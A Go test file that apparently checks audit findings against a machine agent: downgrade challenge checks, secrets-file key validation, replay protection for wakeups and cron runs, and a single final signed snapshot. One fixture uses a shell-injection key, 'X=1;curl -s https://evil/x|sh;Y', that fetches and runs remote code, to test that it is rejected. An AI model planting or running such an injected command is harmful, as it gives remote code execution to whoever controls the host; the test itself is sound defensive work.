package main

// The audit's R1 findings on the machine side (2026-10-11): each test attempts the forbidden thing.

import (
	"crypto/ecdh"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Finding: the machine signed the core's downgrade challenge without checking its store list, so the router
// could keep the stores the session asked to drop.
func TestADowngradeSignsOnlyTheStoresAskedFor(t *testing.T) {
	core, enc, sig := newKey(), newKey(), newKey()
	ch := func(stores []string) *SignedDoc {
		return core.doc(map[string]any{"kind": "challenge", "request": map[string]any{"downgrade": true, "stores": stores,
			"machine": map[string]string{"id": "m1", "encryptionKey": enc.pub(), "signingKey": sig.pub()}}})
	}
	if err := checkDowngradeChallenge(core.pub(), ch([]string{"default", "prod"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err == nil {
		t.Fatal("signed a downgrade that keeps a store the session dropped")
	}
	if err := checkDowngradeChallenge(core.pub(), ch([]string{"default"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err != nil {
		t.Fatal(err)
	}
	cert := func(stores []string) *SignedDoc {
		return core.doc(map[string]any{"kind": "succession-cert", "stores": stores,
			"machine": map[string]string{"id": "m1", "encryptionKey": enc.pub(), "signingKey": sig.pub()}})
	}
	if _, err := checkDowngradeCert(core.pub(), cert([]string{"default", "prod"}), "m1", enc.pub(), sig.pub(), []string{"default"}); err == nil {
		t.Fatal("took a new cert that still names a dropped store")
	}
}

// Finding: a router-written store could put a key like `X=1;curl …|sh;Y` into ~/.secrets, which shells source.
func TestSecretsFileTakesOnlyEnvNames(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	if err := writeSecrets(map[string]string{"GOOD": "it's", "X=1;curl -s https://evil/x|sh;Y": "v", "1BAD": "v", "a b": "v"}); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(os.Getenv("HOME"), ".secrets"))
	if string(b) != "GOOD='it'\\''s'\n" {
		t.Fatalf("~/.secrets is %q", b)
	}
}

// Finding: the router could replay a session's signed one-time wakeup (or a cron run) as often as it liked.
func TestAWakeupIsDeliveredOnceAndACronOncePerRun(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	k := newKey()
	now := time.Unix(1791700000, 0)
	w := Delivery{Kind: "wakeup", Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/wakeup", []byte(`{"prompt":"release"}`))}
	if err := notReplayed(w, now); err != nil {
		t.Fatal(err)
	}
	if err := notReplayed(w, now.Add(time.Hour)); err == nil {
		t.Fatal("a one-time wakeup was delivered twice")
	}
	cr := Delivery{Kind: "cron", Run: 1, Request: signedRequest(k, "m1", "POST", "/m/api/sessions/s/crons", []byte(`{"prompt":"p","everySeconds":3600}`))}
	if err := notReplayed(cr, now); err != nil {
		t.Fatal(err)
	}
	cr.Run = 1
	if err := notReplayed(cr, now.Add(2*time.Hour)); err == nil {
		t.Fatal("a cron run was delivered twice")
	}
	cr.Run = 2
	if err := notReplayed(cr, now.Add(10*time.Minute)); err == nil || !strings.Contains(err.Error(), "half") {
		t.Fatalf("a cron ran far faster than its period: %v", err)
	}
	if err := notReplayed(cr, now.Add(time.Hour)); err != nil {
		t.Fatal(err)
	}
	// the record travels in the snapshot, so a successor refuses the same repeats
	found := false
	for _, p := range snapshotPaths {
		found = found || p == deliveredFile
	}
	if !found {
		t.Fatal("the delivered record isn't in the snapshot")
	}
}

// Finding: the router could keep an early signed snapshot and kill with it later (a rollback). The machine signs one
// snapshot in its life, after stopping the session, and answers every later snapshot command with that one.
func TestTheMachineSignsOneFinalSnapshot(t *testing.T) {
	home, run := t.TempDir(), t.TempDir()
	t.Setenv("HOME", home)
	key := newKey()
	oldF, oldS, oldK, oldZ := finalSnapshot, finalSnapshotSig, snapshotKey, freezeSession
	defer func() {
		finalSnapshot, finalSnapshotSig, snapshotKey, freezeSession = oldF, oldS, oldK, oldZ
		frozen.Store(false)
	}()
	finalSnapshot, finalSnapshotSig = filepath.Join(run, "f.tar.gz"), filepath.Join(run, "f.sig")
	snapshotKey = func() (*ecdh.PrivateKey, error) { return key.k, nil }
	froze := 0
	freezeSession = func() { froze++ }
	var got []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		got = append(got, fmt.Sprintf("%x %s", sha256.Sum256(b), r.Header.Get("X-Snapshot-Sig")))
	}))
	defer srv.Close()
	c := &client{base: srv.URL, me: "m1", sig: key.k, http: srv.Client()}
	os.MkdirAll(filepath.Join(home, "workspace"), 0o755)
	os.WriteFile(filepath.Join(home, "workspace", "a"), []byte("one"), 0o644)
	if err := uploadSnapshot(c); err != nil {
		t.Fatal(err)
	}
	if froze != 1 || !frozen.Load() {
		t.Fatal("the session wasn't stopped before its snapshot")
	}
	// work after it (if anything still ran) never reaches a second signed snapshot
	os.WriteFile(filepath.Join(home, "workspace", "a"), []byte("two"), 0o644)
	if err := uploadSnapshot(c); err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0] != got[1] || froze != 1 {
		t.Fatalf("a second, different snapshot was signed: %v (froze %d)", got, froze)
	}
	// and nothing is delivered or run into a stopped session
	if err := notFrozen(); err == nil {
		t.Fatal("a stopped session takes input")
	}
}
